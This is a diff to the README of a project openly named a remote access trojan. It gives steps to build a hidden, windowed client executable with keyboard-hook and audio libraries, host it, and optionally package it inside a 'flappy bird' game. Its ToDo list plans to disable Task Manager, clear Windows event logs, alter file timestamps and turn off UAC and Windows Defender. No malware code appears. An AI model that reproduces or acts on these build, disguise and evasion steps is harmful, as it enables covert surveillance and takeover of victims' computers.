@@ -57,14 +57,11 @@ git clone https://github.com/Lithium95/ConTroll_Remote_Access_Trojan.git
 ```
 python -m pip install -r requirements.txt
 ```
-3. install pyHook download link
-http://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/
+3. [Download ans Install pyHook](http://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/)
 
-4. Install pythoncom download link
-http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/
+4. [Download and Install pythoncom](http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/)
 
-5. Download pyAudio wheel file link
-https://pypi.python.org/packages/ba/65/ec3042de9a96e8c2eadf9bb88ddbcda434d5c679360f851a2562dd8b9942/PyAudio-0.2.11-cp27-cp27m-win32.whl#md5=fc512e98b5100a11bf8525df750d5987
+5. [Download pyAudio wheel](https://pypi.python.org/packages/ba/65/ec3042de9a96e8c2eadf9bb88ddbcda434d5c679360f851a2562dd8b9942/PyAudio-0.2.11-cp27-cp27m-win32.whl#md5=fc512e98b5100a11bf8525df750d5987)
 
 6. install wheel file
 ```
@@ -78,7 +75,7 @@ python pyinstaller.py --onefile --windowed client.pyw
 ```
 **Skip the next 2 steps if you dont want to use the flappy bird game**
 
-9. Setup a local server to host the client.exe. Use live-server: https://github.com/tapio/live-server
+9. Setup a local server to host the client.exe. Use [live-server](https://github.com/tapio/live-server)
 
 10. Use py2exe to build the flappy bird game
 ```
@@ -95,8 +92,9 @@ python server.py
 
 # ToDo
 
-1. Making the RAT cross platform
-2. Clear the System, Security, and Application logs
-3. Encrypt communication between server and client
-4. Edit the accessed, created, and modified properties of files
-5. Enable/Disable services such as RDP,UAC, and Windows Defender
+1. Disable Task Manager
+2. Making the RAT cross platform
+3. Clear the System, Security, and Application logs
+4. Encrypt communication between server and client
+5. Edit the accessed, created, and modified properties of files
+6. Enable/Disable services such as RDP,UAC, and Windows Defender
